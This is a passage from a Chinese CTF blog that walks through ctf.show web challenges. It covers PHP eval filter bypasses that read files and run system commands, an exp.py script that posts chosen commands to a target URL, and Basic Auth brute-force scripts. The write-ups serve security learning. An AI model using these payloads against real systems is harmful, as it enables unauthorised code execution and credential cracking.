class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fuzz查看pregmatch剩余字符"><a href="#fuzz查看pregmatch剩余字符" class="headerlink" title="fuzz查看pregmatch剩余字符"></a>fuzz查看pregmatch剩余字符</h2><p>先fuzz一下剩下了哪些常用字符：（他看着过滤了括号，但实际上是中文里的括号。。。）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">33</span>; <span class="variable">$i</span> &lt;= <span class="number">126</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678722206004-f1d59aca-48dc-4732-a094-8bd2ad896196.png" alt="image.png"><br>看到结果思考了半天没有想法，看了看wp学到了新姿势：</p><h2 id="套娃解法"><a href="#套娃解法" class="headerlink" title="套娃解法"></a>套娃解法</h2><blockquote><p><a href="https://ctf.show/writeups/1002659">https://ctf.show/writeups/1002659</a><br><a href="https://blog.csdn.net/weixin_46250265/article/details/114266578">https://blog.csdn.net/weixin_46250265/article/details/114266578</a><br><a href="https://www.cnblogs.com/aninock/p/15125215.html">https://www.cnblogs.com/aninock/p/15125215.html</a></p></blockquote><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>来自题目下方的hint：<br>upload：<code>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code><br>分析一下是什么意思，先解释一下其中的各个函数都是什么意思。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">localeconv</span>()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br><span class="line"><span class="title function_ invoke__">scandir</span>()：获取目录下的文件，<span class="title function_ invoke__">scandir</span>(.)：获取当前目录下所有文件</span><br><span class="line"><span class="title function_ invoke__">pos</span>()：返回数组中的当前元素的值。</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>()：数组逆序</span><br><span class="line"><span class="title function_ invoke__">next</span>()： 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()：函数进行文件内容的读取，并输出</span><br></pre></td></tr></table></figure><p>var_dump一下localeconv()函数，第一个对应的值是<code>.</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678802966279-4fce3e4a-9652-4050-96bb-eabf4309afed.png" alt="image.png"><br>构造payload。首先是我们要输出列表下的所有文件：<br><code>print_r(scandir(&#39;.&#39;));</code>但是其中的点和单引号已经被过滤掉了，因此我们需要绕过一下，这就需要用到上面这个函数了（通过函数传参来获得）。所以想使用<code>localeconv()[&quot;decimal_point&quot;]</code>来获取到<code>.</code>但是双引号已经被过滤了。<br>这里有三个函数能够起到替代作用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>() 函数返回数组中的当前元素（单元）,默认取第一个值，</span><br><span class="line"><span class="title function_ invoke__">pos</span>() 同 <span class="title function_ invoke__">current</span>() ,是<span class="title function_ invoke__">current</span>()的别名</span><br><span class="line"><span class="title function_ invoke__">reset</span>() 函数返回数组第一个单元的值，如果数组为空则返回 <span class="literal">FALSE</span></span><br></pre></td></tr></table></figure><p>测试一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803619659-b2d38fe5-349a-4625-bcc9-161167344e25.png" alt="image.png"><br>这时候payload已经初具规模了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803689999-21e077e8-fcb2-43d7-a167-5d2f3d2a74e4.png" alt="image.png"><br>所以我们可以利用这段payload获取到当前文件夹的信息：<br><code>?c=var_dump(scandir(pos(localeconv())));</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803871260-e3107088-3440-4dc7-a3ff-5ab5057ee454.png" alt="image.png"><br><em>当然这次是flag文件就在当前文件夹，如果不在当前文件夹需要使用：</em><code>_var_dump(scandir(&#39;../../&#39;));_</code><br>接下来的思路就是想办法获取到文件。我们可以使用<code>highlight_file()</code>函数（或者使用<code>show_source()</code>）来查看文件。然后就是索引，我们可以使用next、end函数等，以下为相关的方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>()返回数组中的当前元素的值。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">end</span>()将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">next</span>()将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">prev</span>()将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">reset</span>()将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">each</span>()返回当前元素的键名和键值，并将内部指针向前移动。</span><br></pre></td></tr></table></figure><p>但是flag文件不在头尾，所以我们可以使用array_reverse函数来倒转然后通过<code>next</code>函数来获取到文件。<br>至此payload就可以构建了：<code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>当然不可能只有这几个函数恰好能够满足条件。<br>比如说其中的pos函数可以被current、reset函数替换。<br>show_resource函数可以使用high_light函数来替换。<br>pos（localeconv（））的组合函数也可以被getcwd函数替换掉。（getcwd函数会返回当前所在文件夹）。</p><h3 id="方法二利用sessionid（好像不行）"><a href="#方法二利用sessionid（好像不行）" class="headerlink" title="方法二利用sessionid（好像不行）"></a>方法二利用sessionid（好像不行）</h3><p>利用sessionid来传参，但似乎传参也会被过滤，所以对这道题来说好像不太行…<br>upload：<code>?c=session_start();system(session_id());</code>，cookie修改为：<code>PHPSESSID=ls</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678806594280-0004a365-cdbd-46cd-b8b1-7691d0441e58.png" alt="image.png"></p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>首先是payload：<code>?c=eval(array_pop(next(get_defined_vars())));</code>除此之外需要用post传入<code>1=system(&#39;tac fl*&#39;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678807377877-48a49a97-d692-427b-b685-6132ebc2fd30.png" alt="image.png"><br>分析，先讲述一下各个函数的作用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">next</span>()将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">array_pop</span>() 函数删除数组中的最后一个元素并返回其值。 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678807006608-006af0ef-a25d-4623-bfb9-bcb58b1c5b0b.png" alt="image.png"><br>payload的含义就是在post中寻找到对应木马，并运行。、</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这题真的有点东西，思路简单容易理解，但是难在如何找到返回这些需要参数的函数。</p><h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看一下剩余字符：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678884677705-956c818c-49fd-4272-8ebf-a47e532af942.png" alt="image.png"><br>把字符都过滤掉了，觉得应该是用什么方法来替代字符，但是之后就没有思路了。</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p></blockquote><p>看了wp，发现想法没问题。<br>题目中特意提到了，上来先考虑的是：<strong>异或自增和取反</strong>构造字符都无法使用，但是留下了<code>|</code><br>wp提供了两个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">    <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果没有将php写入环境变量，就需要先运行rce_or.php生成文本，将文本置于与exp.py相同目录下，运行exp.py<br>使用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py 你的对应url</span><br></pre></td></tr></table></figure><p>然后分贝在function参数和command参数添加你需要的参数。<br>比如system和ls。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678886696210-9bd0695d-c936-4068-86ac-77249e2e12e5.png" alt="image.png"></p><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>这部分题前面做着还算简单，直到40、41直接来了一个毁灭性打击。难度和前面的根本不是一个量级的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web21-28爆破篇</title>
      <link href="/2023/03/13/web21-28%E7%88%86%E7%A0%B4%E7%AF%87/"/>
      <url>/2023/03/13/web21-28%E7%88%86%E7%A0%B4%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="相关文章及参考资料"><a href="#相关文章及参考资料" class="headerlink" title="相关文章及参考资料"></a>相关文章及参考资料</h1><blockquote><p><a href="https://www.cnblogs.com/meng-han/p/16053552.html"> 暴力破解(生成字典、爆破服务、爆破登录、解密、BurpSuite工具讲解) </a></p></blockquote><h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><p><del>做完了我才发现这些题的字典实在web21里面需要下载…</del></p><h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><blockquote><p>爆破什么的，都是基操</p></blockquote><blockquote><p>burpsuite爆破：<a href="https://www.cnblogs.com/007NBqaq/p/13220297.html">https://www.cnblogs.com/007NBqaq/p/13220297.html</a></p></blockquote><p>直接展示登陆界面，随便输点什么，抓包，可以发现把账号密码放在了请求头中，并且根据末尾的==可以看出是base64加密，因此我们直接尝试Intruder模块爆破。<br>原理我们都懂，但是我们该如何操作呢？</p><h2 id="方案一-burpsuite爆破"><a href="#方案一-burpsuite爆破" class="headerlink" title="方案一 burpsuite爆破"></a>方案一 burpsuite爆破</h2><p>将请求转入intruder，因为会拼接payload，所以使用基本的sniper类型就行，在payload sets里面修改payload tpe为<code>Custom Interator</code>，并且在payload option中按照顺序修改三个position。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726131628-7ca04364-333b-48e3-bdaf-bd5ff55d6c8f.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726143875-172fd7f8-7d60-4f5c-8d79-57aec5d46650.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726152940-8e723666-ba55-4d24-8e87-9123771ee382.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726186298-73d9efbc-8154-40c3-b2f0-2ffdbccf833a.png" alt="image.png"><br>而且我们观察可以注意到，我们还需要将payload使用base64加密，因此在payload processing里面添加转换：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726245072-04e6ff20-acd9-45aa-a639-db4e41b833f7.png" alt="image.png"><br>最后再将末尾的转义关闭。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726288398-49c8a4bd-7ee2-4cb6-b38c-8c3cdb8614be.png" alt="image.png"><br>这种情况下爆破即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677727052915-6090cb47-a08f-4b1a-b670-0f34b353ce1d.png" alt="image.png"></p><h2 id="方案二-脚本爆破"><a href="#方案二-脚本爆破" class="headerlink" title="方案二 脚本爆破"></a>方案二 脚本爆破</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2020-11-20 19:16:49</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-11-20 20:28:42</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://41a801fe-a420-47bc-8593-65c3f26b7efa.chall.ctf.show/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">password = []</span><br><span class="line"></span><br><span class="line">with <span class="title function_ invoke__">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    data = f.<span class="title function_ invoke__">readline</span>() </span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">    password.<span class="title function_ invoke__">append</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p in password:</span><br><span class="line">strs = <span class="string">&#x27;admin:&#x27;</span>+ p[:-<span class="number">1</span>]</span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="title function_ invoke__">format</span>(base64.<span class="title function_ invoke__">b64encode</span>(strs.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_ invoke__">decode</span>(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">&#125;</span><br><span class="line">rep =requests.<span class="title function_ invoke__">get</span>(url,headers=header)</span><br><span class="line">time.<span class="title function_ invoke__">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">if</span> rep.status_code ==<span class="number">200</span>:</span><br><span class="line"><span class="keyword">print</span>(rep.text)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h1><blockquote><p>域名也可以爆破的，试试爆破这个ctf.show的子域名</p></blockquote><h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><blockquote><p>还爆破？这么多代码，告辞！</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ 